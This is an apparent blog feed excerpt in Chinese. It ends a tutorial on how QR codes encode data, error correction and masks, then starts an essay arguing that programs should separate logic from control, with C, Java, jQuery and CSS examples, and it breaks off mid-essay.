<span class="ez-toc-section" id="%E5%AE%9A%E4%BD%8D%E5%9B%BE%E6%A1%88"></span>定位图案<span class="ez-toc-section-end"></span>
</h5>
<ul>
<li>Position Detection Pattern是定位图案，用于标记二维码的矩形大小。这三个定位图案有白边叫Separators for Postion Detection Patterns。之所以三个而不是四个意思就是三个就可以标识一个矩形了。</li>
</ul>
<ul>
<li>Timing Patterns也是用于定位的。原因是二维码有40种尺寸，尺寸过大了后需要有根标准线，不然扫描的时候可能会扫歪了。</li>
</ul>
<ul>
<li>Alignment Patterns 只有Version 2以上（包括Version2）的二维码需要这个东东，同样是为了定位用的。</li>
</ul>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="%E5%8A%9F%E8%83%BD%E6%80%A7%E6%95%B0%E6%8D%AE"></span>功能性数据<span class="ez-toc-section-end"></span>
</h5>
<ul>
<li>Format Information 存在于所有的尺寸中，用于存放一些格式化数据的。</li>
</ul>
<ul>
<li>Version Information 在 &gt;= Version 7以上，需要预留两块3 x 6的区域存放一些版本信息。</li>
</ul>
<h5>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E7%A0%81%E5%92%8C%E7%BA%A0%E9%94%99%E7%A0%81"></span>数据码和纠错码<span class="ez-toc-section-end"></span>
</h5>
<ul>
<li>除了上述的那些地方，剩下的地方存放 Data Code 数据码 和 Error Correction Code 纠错码。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81"></span>数据编码<span class="ez-toc-section-end"></span>
</h4>
<p>我们先来说说数据编码。QR码支持如下的编码：</p>
<p><strong>Numeric mode</strong> 数字编码，从0到9。如果需要编码的数字的个数不是3的倍数，那么，最后剩下的1或2位数会被转成4或7bits，则其它的每3位数字会被编成 10，12，14bits，编成多长还要看二维码的尺寸（下面有一个表Table 3说明了这点）</p>
<p><strong>Alphanumeric mode</strong> 字符编码。包括 0-9，大写的A到Z（没有小写），以及符号$ % * + – . / : 包括空格。这些字符会映射成一个字符索引表。如下所示：（其中的SP是空格，Char是字符，Value是其索引值） 编码的过程是把字符两两分组，然后转成下表的45进制，然后转成11bits的二进制，如果最后有一个落单的，那就转成6bits的二进制。而编码模式和字符的个数需要根据不同的Version尺寸编成9, 11或13个二进制（如下表中Table 3）</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p><strong>Byte mode</strong>, 字节编码，可以是0-255的ISO-8859-1字符。有些二维码的扫描器可以自动检测是否是UTF-8的编码。</p>
<p><strong>Kanji mode</strong> 这是日文编码，也是双字节编码。同样，也可以用于中文编码。日文和汉字的编码会减去一个值。如：在0X8140 to 0X9FFC中的字符会减去8140，在0XE040到0XEBBF中的字符要减去0XC140，然后把结果前两个16进制位拿出来乘以0XC0，然后再加上后两个16进制位，最后转成13bit的编码。如下图示例：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p><strong>Extended Channel Interpretation (ECI) mode</strong> 主要用于特殊的字符集。并不是所有的扫描器都支持这种编码。</p>
<p><strong>Structured Append mode</strong> 用于混合编码，也就是说，这个二维码中包含了多种编码格式。</p>
<p><strong>FNC1 mode</strong> 这种编码方式主要是给一些特殊的工业或行业用的。比如GS1条形码之类的。</p>
<p>简单起见，后面三种不会在本文 中讨论。</p>
<p>下面两张表中，</p>
<ul>
<li>Table 2 是各个编码格式的“编号”，这个东西要写在Format Information中。注：中文是1101</li>
</ul>
<ul>
<li>Table 3 表示了，不同版本（尺寸）的二维码，对于，数字，字符，字节和Kanji模式下，对于单个编码的2进制的位数。（在二维码的规格说明书中，有各种各样的编码规范表，后面还会提到）</li>
</ul>
<p><img alt="image placeholder" ></p>
<p>下面我们看几个示例，</p>
<h5>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%95%B0%E5%AD%97%E7%BC%96%E7%A0%81"></span>示例一：数字编码<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;">在Version 1的尺寸下，纠错级别为H的情况下，编码： 01234567</p>
<p style="padding-left: 30px;">1. 把上述数字分成三组: 012 345 67</p>
<p style="padding-left: 30px;">2. 把他们转成二进制:  012 转成 0000001100；  345 转成 0101011001；  67 转成 1000011。</p>
<p style="padding-left: 30px;">3. 把这三个二进制串起来: 0000001100 0101011001 1000011</p>
<p style="padding-left: 30px;">4. 把数字的个数转成二进制 (version 1-H是10 bits ): 8个数字的二进制是 0000001000</p>
<p style="padding-left: 30px;">5. 把数字编码的标志0001和第4步的编码加到前面:  0001 0000001000 0000001100 0101011001 1000011</p>
<h5>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B%E4%BA%8C%EF%BC%9A%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"></span>示例二：字符编码<span class="ez-toc-section-end"></span>
</h5>
<p style="padding-left: 30px;">在Version 1的尺寸下，纠错级别为H的情况下，编码: AC-42</p>
<p style="padding-left: 30px;">1. 从字符索引表中找到 AC-42 这五个字条的索引 (10,12,41,4,2)</p>
<p style="padding-left: 30px;">2. 两两分组: (10,12) (41,4) (2)</p>
<p style="padding-left: 30px;">3.把每一组转成11bits的二进制:</p>
<p style="padding-left: 60px;">(10,12) 10*45+12 等于 462 转成 00111001110<br>
(41,4) 41*45+4 等于 1849 转成 11100111001<br>
(2) 等于 2 转成 000010</p>
<p style="padding-left: 30px;">4. 把这些二进制连接起来：00111001110 11100111001 000010</p>
<p style="padding-left: 30px;">5. 把字符的个数转成二进制 (Version 1-H为9 bits ): 5个字符，5转成 000000101</p>
<p style="padding-left: 30px;">6. 在头上加上编码标识 0010 和第5步的个数编码:  0010 000000101 00111001110 11100111001 000010</p>
<h4>
<span class="ez-toc-section" id="%E7%BB%93%E6%9D%9F%E7%AC%A6%E5%92%8C%E8%A1%A5%E9%BD%90%E7%AC%A6"></span>结束符和补齐符<span class="ez-toc-section-end"></span>
</h4>
<p>假如我们有个HELLO WORLD的字符串要编码，根据上面的示例二，我们可以得到下面的编码，</p>
<table>
<tbody>
<tr>
<th>编码</th>
<th>字符数</th>
<th>HELLO WORLD的编码</th>
</tr>
<tr>
<td>0010</td>
<td>000001011</td>
<td>01100001011 01111000110 10001011100 10110111000 10011010100 001101</td>
</tr>
</tbody>
</table>
<p>我们还要加上结束符：</p>
<table>
<tbody>
<tr>
<th>编码</th>
<th>字符数</th>
<th>HELLO WORLD的编码</th>
<th>结束</th>
</tr>
<tr>
<td>0010</td>
<td>000001011</td>
<td>01100001011 01111000110 10001011100 10110111000 10011010100 001101</td>
<td>0000</td>
</tr>
</tbody>
</table>
<h5>
<span class="ez-toc-section" id="%E6%8C%898bits%E9%87%8D%E6%8E%92"></span>按8bits重排<span class="ez-toc-section-end"></span>
</h5>
<p>如果所有的编码加起来不是8个倍数我们还要在后面加上足够的0，比如上面一共有78个bits，所以，我们还要加上2个0，然后按8个bits分好组：</p>
<p>00100000   01011011   00001011   01111000   11010001   01110010   11011100   01001101   01000011   010000<span style="color: #ff0000;"><strong>00</strong></span></p>
<h5>
<span class="ez-toc-section" id="%E8%A1%A5%E9%BD%90%E7%A0%81%EF%BC%88Padding_Bytes%EF%BC%89"></span>补齐码（Padding Bytes）<span class="ez-toc-section-end"></span>
</h5>
<p>最后，如果如果还没有达到我们最大的bits数的限制，我们还要加一些补齐码（Padding Bytes），Padding Bytes就是重复下面的两个bytes：11101100 00010001 （这两个二进制转成十进制是236和17，我也不知道为什么，只知道Spec上是这么写的）关于每一个Version的每一种纠错级别的最大Bits限制，可以参看<a href="http://raidenii.net/files/datasheets/misc/qr_code.pdf" target="_blank">QR Code Spec</a>的第28页到32页的Table-7一表。</p>
<p>假设我们需要编码的是Version 1的Q纠错级，那么，其最大需要104个bits，而我们上面只有80个bits，所以，还需要补24个bits，也就是需要3个Padding Bytes，我们就添加三个，于是得到下面的编码：</p>
<p>00100000 01011011 00001011 01111000 11010001 01110010 11011100 01001101 01000011 01000000 <span style="color: #ff0000;"><strong>11101100 00010001 11101100</strong></span></p>
<p>上面的编码就是数据码了，叫Data Codewords，每一个8bits叫一个codeword，我们还要对这些数据码加上纠错信息。</p>
<h4>
<span class="ez-toc-section" id="%E7%BA%A0%E9%94%99%E7%A0%81"></span>纠错码<span class="ez-toc-section-end"></span>
</h4>
<p>上面我们说到了一些纠错级别，Error Correction Code Level，二维码中有四种级别的纠错，这就是为什么二维码有残缺还能扫出来，也就是为什么有人在二维码的中心位置加入图标。</p>
<table>
<tbody>
<tr>
<th colspan="2">错误修正容量</th>
</tr>
<tr>
<td>L水平</td>
<td>7%的字码可被修正</td>
</tr>
<tr>
<td>M水平</td>
<td>15%的字码可被修正</td>
</tr>
<tr>
<td>Q水平</td>
<td>25%的字码可被修正</td>
</tr>
<tr>
<td>H水平</td>
<td>30%的字码可被修正</td>
</tr>
</tbody>
</table>
<p>那么，QR是怎么对数据码加上纠错码的？首先，我们需要对数据码进行分组，也就是分成不同的Block，然后对各个Block进行纠错编码，对于如何分组，我们可以查看<a href="http://raidenii.net/files/datasheets/misc/qr_code.pdf" target="_blank">QR Code Spec</a>的第33页到44页的Table-13到Table-22的定义表。注意最后两列：</p>
<ul>
<li>
<strong>Number of Error Code Correction Blocks</strong> ：需要分多少个块。</li>
</ul>
<ul>
<li>
<strong>Error Correction Code Per Blocks</strong>：每一个块中的code个数，所谓的code的个数，也就是有多少个8bits的字节。</li>
</ul>
<p><img alt="image placeholder" ></p>
<p>举个例子：上述的Version 5 + Q纠错级：需要4个Blocks（2个Blocks为一组，共两组），头一组的两个Blocks中各15个bits数据 + 各 9个bits的纠错码（注：表中的codewords就是一个8bits的byte）（再注：最后一例中的（c, k, r ）的公式为：c = k + 2 * r，因为后脚注解释了：纠错码的容量小于纠错码的一半）</p>
<p>下图给一个5-Q的示例（因为二进制写起来会让表格太大，所以，我都用了十进制，我们可以看到每一块的纠错码有18个codewords，也就是18个8bits的二进制数）</p>
<table>
<tbody>
<tr>
<th>组</th>
<th>块</th>
<th>数据</th>
<th>对每个块的纠错码</th>
</tr>
<tr>
<td style="text-align: center;" rowspan="2">1</td>
<td style="text-align: center;">1</td>
<td>67 85 70 134 87 38 85 194 119 50 6 18 6 103 38</td>
<td>213 199 11 45 115 247 241 223 229 248 154 117 154 111 86 161 111 39</td>
</tr>
<tr>
<td style="text-align: center;">2</td>
<td>246 246 66 7 118 134 242 7 38 86 22 198 199 146 6</td>
<td>87 204 96 60 202 182 124 157 200 134 27 129 209 17 163 163 120 133</td>
</tr>
<tr>
<td style="text-align: center;" rowspan="2">2</td>
<td style="text-align: center;">1</td>
<td>182 230 247 119 50 7 118 134 87 38 82 6 134 151 50 7</td>
<td>148 116 177 212 76 133 75 242 238 76 195 230 189 10 108 240 192 141</td>
</tr>
<tr>
<td style="text-align: center;">2</td>
<td>70 247 118 86 194 6 151 50 16 236 17 236 17 236 17 236</td>
<td>235 159 5 173 24 147 59 33 106 40 255 172 82 2 131 32 178 236</td>
</tr>
</tbody>
</table>
<p>注：二维码的纠错码主要是通过<a href="https://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction">Reed-Solomon error correction</a>（里德-所罗门纠错算法）来实现的。对于这个算法，对于我来说是相当的复杂，里面有很多的数学计算，比如：多项式除法，把1-255的数映射成2的n次方（0&lt;=n&lt;=255）的伽罗瓦域Galois Field之类的神一样的东西，以及基于这些基础的纠错数学公式，因为我的数据基础差，对于我来说太过复杂，所以我一时半会儿还有点没搞明白，还在学习中，所以，我在这里就不展开说这些东西了。还请大家见谅了。（当然，如果有朋友很明白，也繁请教教我）</p>
<h4>
<span class="ez-toc-section" id="%E6%9C%80%E7%BB%88%E7%BC%96%E7%A0%81"></span>最终编码<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="%E7%A9%BF%E6%8F%92%E6%94%BE%E7%BD%AE"></span>穿插放置<span class="ez-toc-section-end"></span>
</h5>
<p>如果你以为我们可以开始画图，你就错了。二维码的混乱技术还没有玩完，它还要把数据码和纠错码的各个codewords交替放在一起。如何交替呢，规则如下：</p>
<p>对于数据码：把每个块的第一个codewords先拿出来按顺度排列好，然后再取第一块的第二个，如此类推。如：上述示例中的Data Codewords如下：</p>
<table class="coolshell">
<tbody>
<tr>
<td class="head">块 1</td>
<td>67</td>
<td>85</td>
<td>70</td>
<td>134</td>
<td>87</td>
<td>38</td>
<td>85</td>
<td>194</td>
<td>119</td>
<td>50</td>
<td>6</td>
<td>18</td>
<td>6</td>
<td>103</td>
<td>38</td>
<td></td>
</tr>
<tr>
<td class="head">块 2</td>
<td>246</td>
<td>246</td>
<td>66</td>
<td>7</td>
<td>118</td>
<td>134</td>
<td>242</td>
<td>7</td>
<td>38</td>
<td>86</td>
<td>22</td>
<td>198</td>
<td>199</td>
<td>146</td>
<td>6</td>
<td></td>
</tr>
<tr>
<td class="head">块 3</td>
<td>182</td>
<td>230</td>
<td>247</td>
<td>119</td>
<td>50</td>
<td>7</td>
<td>118</td>
<td>134</td>
<td>87</td>
<td>38</td>
<td>82</td>
<td>6</td>
<td>134</td>
<td>151</td>
<td>50</td>
<td>7</td>
</tr>
<tr>
<td class="head">块 4</td>
<td>70</td>
<td>247</td>
<td>118</td>
<td>86</td>
<td>194</td>
<td>6</td>
<td>151</td>
<td>50</td>
<td>16</td>
<td>236</td>
<td>17</td>
<td>236</td>
<td>17</td>
<td>236</td>
<td>17</td>
<td>236</td>
</tr>
</tbody>
</table>
<p>我们先取第一列的：67， 246， 182， 70</p>
<p>然后再取第二列的：67， 246， 182， 70， 85，246，230 ，247</p>
<p>如此类推：67， 246， 182， 70， 85，246，230 ，247 ………  ……… ，38，6，50，17，7，236</p>
<p>对于纠错码，也是一样：</p>
<table class="coolshell">
<tbody>
<tr>
<td class="head">块 1</td>
<td>213</td>
<td>199</td>
<td>11</td>
<td>45</td>
<td>115</td>
<td>247</td>
<td>241</td>
<td>223</td>
<td>229</td>
<td>248</td>
<td>154</td>
<td>117</td>
<td>154</td>
<td>111</td>
<td>86</td>
<td>161</td>
<td>111</td>
<td>39</td>
</tr>
<tr>
<td class="head">块 2</td>
<td>87</td>
<td>204</td>
<td>96</td>
<td>60</td>
<td>202</td>
<td>182</td>
<td>124</td>
<td>157</td>
<td>200</td>
<td>134</td>
<td>27</td>
<td>129</td>
<td>209</td>
<td>17</td>
<td>163</td>
<td>163</td>
<td>120</td>
<td>133</td>
</tr>
<tr>
<td class="head">块 3</td>
<td>148</td>
<td>116</td>
<td>177</td>
<td>212</td>
<td>76</td>
<td>133</td>
<td>75</td>
<td>242</td>
<td>238</td>
<td>76</td>
<td>195</td>
<td>230</td>
<td>189</td>
<td>10</td>
<td>108</td>
<td>240</td>
<td>192</td>
<td>141</td>
</tr>
<tr>
<td class="head">块 4</td>
<td>235</td>
<td>159</td>
<td>5</td>
<td>173</td>
<td>24</td>
<td>147</td>
<td>59</td>
<td>33</td>
<td>106</td>
<td>40</td>
<td>255</td>
<td>172</td>
<td>82</td>
<td>2</td>
<td>131</td>
<td>32</td>
<td>178</td>
<td>236</td>
</tr>
</tbody>
</table>
<p>和数据码取的一样，得到：213，87，148，235，199，204，116，159，…… …… 39，133，141，236</p>
<p>然后，再把这两组放在一起（纠错码放在数据码之后）得到：</p>
<p>67, 246, 182, 70, 85, 246, 230, 247, 70, 66, 247, 118, 134, 7, 119, 86, 87, 118, 50, 194, 38, 134, 7, 6, 85, 242, 118, 151, 194, 7, 134, 50, 119, 38, 87, 16, 50, 86, 38, 236, 6, 22, 82, 17, 18, 198, 6, 236, 6, 199, 134, 17, 103, 146, 151, 236, 38, 6, 50, 17, 7, 236, 213, 87, 148, 235, 199, 204, 116, 159, 11, 96, 177, 5, 45, 60, 212, 173, 115, 202, 76, 24, 247, 182, 133, 147, 241, 124, 75, 59, 223, 157, 242, 33, 229, 200, 238, 106, 248, 134, 76, 40, 154, 27, 195, 255, 117, 129, 230, 172, 154, 209, 189, 82, 111, 17, 10, 2, 86, 163, 108, 131, 161, 163, 240, 32, 111, 120, 192, 178, 39, 133, 141, 236</p>
<p>这就是我们的数据区。</p>
<h5>
<span class="ez-toc-section" id="Remainder_Bits"></span>Remainder Bits<span class="ez-toc-section-end"></span>
</h5>
<p>最后再加上Reminder Bits，对于某些Version的QR，上面的还不够长度，还要加上Remainder Bits，比如：上述的5Q版的二维码，还要加上7个bits，Remainder Bits加零就好了。关于哪些Version需要多少个Remainder bit，可以参看<a href="http://raidenii.net/files/datasheets/misc/qr_code.pdf" target="_blank">QR Code Spec</a>的第15页的Table-1的定义表。</p>
<h4>
<span class="ez-toc-section" id="%E7%94%BB%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%9B%BE"></span>画二维码图<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="Position_Detection_Pattern"></span>Position Detection Pattern<span class="ez-toc-section-end"></span>
</h5>
<p>首先，先把Position Detection图案画在三个角上。（无论Version如何，这个图案的尺寸就是这么大）</p>
<p><img alt="image placeholder" ></p>
<h5>
<span class="ez-toc-section" id="Alignment_Pattern"></span>Alignment Pattern<span class="ez-toc-section-end"></span>
</h5>
<p>然后，再把Alignment图案画上（无论Version如何，这个图案的尺寸就是这么大）</p>
<p><img alt="image placeholder" ></p>
<p>关于Alignment的位置，可以查看<a href="http://raidenii.net/files/datasheets/misc/qr_code.pdf" target="_blank">QR Code Spec</a>的第81页的Table-E.1的定义表（下表是不完全表格）</p>
<p><img alt="image placeholder" ></p>
<p>下图是根据上述表格中的Version8的一个例子（6，24，42）</p>
<p><img alt="image placeholder" ></p>
<h5>
<span class="ez-toc-section" id="Timing_Pattern"></span>Timing Pattern<span class="ez-toc-section-end"></span>
</h5>
<p>接下来是Timing Pattern的线（这个不用多说了）</p>
<p style="text-align: center;"><strong><img alt="image placeholder" ></strong></p>
<h5>
<span class="ez-toc-section" id="Format_Information"></span>Format Information<span class="ez-toc-section-end"></span>
</h5>
<p>再接下来是Formation Information，下图中的蓝色部分。</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p style="text-align: left;">Format Information是一个15个bits的信息，每一个bit的位置如下图所示：（注意图中的Dark Module，那是永远出现的）</p>
<p style="text-align: left;"><img alt="image placeholder" ></p>
<p style="text-align: left;">这15个bits中包括：</p>
<ul>
<li>5个数据bits：其中，2个bits用于表示使用什么样的Error Correction Level， 3个bits表示使用什么样的Mask</li>
<li>10个纠错bits。主要通过BCH Code来计算</li>
</ul>
<p>然后15个bits还要与101010000010010做XOR操作。这样就保证不会因为我们选用了00的纠错级别和000的Mask，从而造成全部为白色，这会增加我们的扫描器的图像识别的困难。</p>
<p>下面是一个示例：</p>
<p><img alt="image placeholder" ></p>
<p>关于Error Correction Level如下表所示：</p>
<p><img alt="image placeholder" ></p>
<p>关于Mask图案如后面的Table 23所示。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="Version_Information"></span>Version Information<span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: left;">再接下来是Version Information（版本7以后需要这个编码），下图中的蓝色部分。<br>
<img alt="image placeholder" ></p>
<p>Version Information一共是18个bits，其中包括6个bits的版本号以及12个bits的纠错码，下面是一个示例：</p>
<p><img alt="image placeholder" ></p>
<p>而其填充位置如下：</p>
<p><img alt="image placeholder" ></p>
<h5>
<span class="ez-toc-section" id="%E6%95%B0%E6%8D%AE%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BA%A0%E9%94%99%E7%A0%81"></span>数据和数据纠错码<span class="ez-toc-section-end"></span>
</h5>
<p>然后是填接我们的最终编码，最终编码的填充方式如下：从左下角开始沿着红线填我们的各个bits，1是黑色，0是白色。如果遇到了上面的非数据区，则绕开或跳过。</p>
<p><img alt="image placeholder" ></p>
<h5>
<span class="ez-toc-section" id="%E6%8E%A9%E7%A0%81%E5%9B%BE%E6%A1%88"></span>掩码图案<span class="ez-toc-section-end"></span>
</h5>
<p>这样下来，我们的图就填好了，但是，也许那些点并不均衡，如果出现大面积的空白或黑块，会告诉我们扫描识别的困难。所以，我们还要做Masking操作（靠，还嫌不复杂）QR的Spec中说了，QR有8个Mask你可以使用，如下所示：其中，各个mask的公式在各个图下面。所谓mask，说白了，就是和上面生成的图做XOR操作。Mask只会和数据区进行XOR，不会影响功能区。（<strong>注：选择一个合适的Mask也是有算法的</strong>）</p>
<p><img alt="image placeholder" ></p>
<p>其Mask的标识码如下所示：（其中的i,j分别对应于上图的x,y）</p>
<p><img alt="image placeholder" ></p>
<p>下面是Mask后的一些样子，我们可以看到被某些Mask XOR了的数据变得比较零散了。</p>
<p><img alt="image placeholder" ></p>
<p>Mask过后的二维码就成最终的图了。</p>
<p>好了，大家可以去尝试去写一下QR的编码程序，当然，你可以用网上找个Reed Soloman的纠错算法的库，或是看看别人的源代码是怎么实现这个繁锁的编码。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-10-29T08:32:35+08:00</pubDate>
<guid>https://coolshell.cn/articles/10590.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序的本质复杂性和元语言抽象 ]]></title>
<link>https://coolshell.cn/articles/10652.html</link>
<content><![CDATA[ 
<p><strong>（感谢 <a href="https://weibo.com/weidagang" target="_blank">@文艺复兴记</a>（todd） 投递此文）</strong></p>
<h4>组件复用技术的局限性</h4>
<p>常听到有人讲“我写代码很讲究，一直严格遵循<a href="https://en.wikipedia.org/wiki/Don't_repeat_yourself">DRY原则</a>，把重复使用的功能都封装成可复用的组件，使得代码简短优雅，同时也易于理解和维护”。显然，DRY原则和组件复用技术是最常见的改善代码质量的方法，不过，在我看来以这类方法为指导，能帮助我们写出“不错的程序”，但还不足以帮助我们写出简短、优雅、易理解、易维护的“好程序”。对于熟悉Martin Fowler《重构》和GoF《设计模式》的程序员，我常常提出这样一个问题帮助他们进一步加深对程序的理解：</p>
<blockquote><p>如果目标是代码“简短、优雅、易理解、易维护”，组件复用技术是最好的方法吗？这种方法有没有根本性的局限？</p></blockquote>
<p>虽然基于函数、类等形式的组件复用技术从一定程度上消除了冗余，提升了代码的抽象层次，但是这种技术却有着本质的局限性，其根源在于 <strong>每种组件形式都代表了特定的抽象维度，组件复用只能在其维度上进行抽象层次的提升</strong>。比如，我们可以把常用的HashMap等功能封装为类库，但是不管怎么封装复用类永远是类，封装虽然提升了代码的抽象层次，但是它永远不会变成Lambda，而实际问题所代表的抽象维度往往与之并不匹配。</p>
<p>以常见的二进制消息的解析为例，组件复用技术所能做到的只是把读取字节，检查约束，计算CRC等功能封装成函数，这是远远不够的。比如，下面的表格定义了二进制消息X的格式：</p>
<p><span id="more-10652"></span></p>
<pre>Message X:
--------------------------------------------------------
| ID |  Name           | Type    | Size | Constraints  |
--------------------------------------------------------
| 1  | message type    | int     | 1    | = 0x01       |
--------------------------------------------------------
| 2  | payload size    | int     | 2    | &gt; 0          |
--------------------------------------------------------
| 3  | payload         | bytes   | &lt;2&gt;  |              |
--------------------------------------------------------
| 4  | CRC             | int     | 4    |              |
--------------------------------------------------------</pre>
<p>它的解析函数大概是这个样子：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">bool parse_message_x(char* data, int32 size, MessageX&amp; x) {
    char *ptr = data;
    if (ptr + sizeof(int8) &lt;= data + size) {
        x.message_type = read_int8(ptr);
        if (0x01 != x.message_type) return false;
        ptr += sizeof(int8);
    } else {
        return false;
    }
    if (ptr + sizeof(int16) &lt;= data + size) {
        x.payload_size = read_int16(ptr);
        ptr += sizeof(int16);
    } else {
        return false;
    }
    if (ptr + x.payload_size &lt;= data + size) {
        x.payload = new int8[x.payload_size];
        read(ptr, x.payload, x.payload_size);
        ptr += x.payload_size;
    } else {
        return false;
    }
    if (ptr + sizeof(int32) &lt;= data + size) {
        x.crc = read_int32(ptr);
        ptr += sizeof(int32);
    } else {
        delete x.payload;
        return false;
    }
    if (crc(data, sizeof(int8) + sizeof(int16) + x.payload_size) != x.crc) {
        delete x.payload;
        return false;
    }
    return true;
}
[/cpp]


很明显，虽然消息X的定义非常简单，但是它的解析函数却显得很繁琐，需要小心翼翼地处理很多细节。在处理其他消息Y时，虽然虽然Y和X很相似，但是却不得不再次在解析过程中处理这些细节，就是组件复用方法的局限性，它只能帮我们按照函数或者类的语义把功能封装成可复用的组件，但是消息的结构特征既不是函数也不是类，这就是抽象维度的失配。
&lt;h4&gt;&lt;a href="http://www.cnblogs.com/weidagang2046/p/the-nature-of-meta.html#-2" name="-2"&gt;&lt;/a&gt;程序的本质复杂性&lt;/h4&gt;
上面分析了组件复用技术有着根本性的局限性，现在我们要进一步思考：
&lt;blockquote&gt;如果目标还是代码“简短、优雅、易理解、易维护”，那么代码优化是否有一个理论极限？这个极限是由什么决定的？普通代码比起最优代码多出来的“冗余部分”到底干了些什么事情？&lt;/blockquote&gt;
回答这个问题要从程序的本质说起。Pascal语言之父Niklaus Wirth在70年代提出：Program = Data Structure + Algorithm，随后逻辑学家和计算机科学家R Kowalski进一步提出：Algorithm = Logic + Control。谁更深刻更有启发性？当然是后者！而且我认为数据结构和算法都属于控制策略，综合二位的观点，加上我自己的理解，程序的本质是：Program = Logic + Control。换句话说，程序包含了逻辑和控制两个维度。

逻辑就是问题的定义，比如，对于排序问题来讲，逻辑就是“什么叫做有序，什么叫大于，什么叫小于，什么叫相等”？控制就是如何合理地安排时间和空间资源去实现逻辑。逻辑是程序的灵魂，它定义了程序的本质；控制是为逻辑服务的，是非本质的，可以变化的，如同排序有几十种不同的方法，时间空间效率各不相同，可以根据需要采用不同的实现。

程序的复杂性包含了本质复杂性和非本质复杂性两个方面。套用这里的术语， &lt;strong&gt;程序的本质复杂性就是逻辑，非本质复杂性就是控制&lt;/strong&gt;。逻辑决定了代码复杂性的下限，也就是说不管怎么做代码优化，Office程序永远比Notepad程序复杂，这是因为前者的逻辑就更为复杂。如果要代码简洁优雅，任何语言和技术所能做的只是尽量接近这个本质复杂性，而不可能超越这个理论下限。

理解"程序的本质复杂性是由逻辑决定的"从理论上为我们指明了代码优化的方向：让逻辑和控制这两个维度保持正交关系。来看Java的Collections.sort方法的例子：

[java]
interface Comparator&lt;T&gt; {
    int compare(T o1, T o2);
}
public static &lt;T&gt; void sort(List&lt;T&gt; list, Comparator&lt;? super T&gt; comparator)
[/java]


使用者只关心逻辑部份，即提供一个Comparator对象表明序在类型T上的定义；控制的部分完全交给方法实现者，可以有多种不同的实现，这就是逻辑和控制解耦。同时，我们也可以断定，这个设计已经达到了代码优化的理论极限，不会有本质上比它更简洁的设计（忽略相同语义的语法差异），为什么？因为逻辑决定了它的本质复杂度，Comparator和Collections.sort的定义完全是逻辑的体现，不包含任何非本质的控制部分。

另外需要强调的是，上面讲的“控制是非本质复杂性”并不是说控制不重要，控制往往直接决定了程序的性能，当我们因为性能等原因必须采用某种控制的时候，实际上被固化的控制策略也是一种逻辑。比如，当你的需求是“从进程虚拟地址ptr1拷贝1024个字节到地址ptr2“，那么它就是问题的定义，它就是逻辑，这时，提供进程虚拟地址直接访问语义的底层语言就与之完全匹配，反而是更高层次的语言对这个需求无能为力。

介绍了逻辑和控制的关系，可能很多朋友已经开始意识到了上面二进制文件解析实现的问题在哪里，其实这也是 &lt;strong&gt;绝大多数程序不够简洁优雅的根本原因：逻辑与控制耦合&lt;/strong&gt;。上面那个消息定义表格就是不包含控制的纯逻辑，我相信即使不是程序员也能读懂它；而相应的代码把逻辑和控制搅在一起之后就不那么容易读懂了。

熟悉OOP和GoF设计模式的朋友可能会把“逻辑与控制解耦”与经常听说的“接口和实现解耦”联系在一起，他们是不是一回事呢？其实，把这里所说的逻辑和OOP中的接口划等号是似是而非的， 而GoF设计模式最大的问题就在于有意无意地让人们以为“what就是interface, interface就是what”，很多朋友一想到要表达what，要抽象，马上写个接口出来，这就是潜移默化的惯性思维，自己根本意识不到问题在哪里。其实，接口和前面提到的组件复用技术一样，同样受限于特定的抽象维度，它不是表达逻辑的通用方法，比如，我们无法把二进制文件格式特征用接口来表示。

另外，我们熟悉的许多GoF模式以“逻辑与控制解耦”的观点来看，都不是最优的。比如，很多时候Observer模式都是典型的以控制代逻辑，来看一个例子：
&lt;blockquote&gt;对于某网页的超链接，要求其颜色随着状态不同而变化，点击之前的颜色是#FF0000，点击后颜色变成#00FF00。&lt;/blockquote&gt;
基于Observer模式的实现是这样的：

[javascript]
$(a).css('color', '#FF0000');

$(a).click(function() {
    $(this).css('color', '#00FF00');
});
[/javascript]


而基于纯CSS的实现是这样的：

[css]
a:link {color: #FF0000}
a:visited {color: #00FF00}
[/css]
通过对比，您看出二者的差别了吗？显然，Observer模式包含了非本质的控制，而CSS是只包含逻辑。理论上讲，CSS能做的事情，JavaScript都能通过控制做到，那么为什么浏览器的设计者要引入CSS呢，这对我们有何启发呢？&lt;/pre&gt;
&lt;h4&gt;&lt;a href="http://www.cnblogs.com/weidagang2046/p/the-nature-of-meta.html#-3" name="-3"&gt;&lt;/a&gt;元语言抽象&lt;/h4&gt;
好的，我们继续思考下面这个问题：
&lt;blockquote&gt;
逻辑决定了程序的本质复杂性，但接口不是表达逻辑的通用方式，那么是否存在表达逻辑的通用方式呢？&lt;/blockquote&gt;

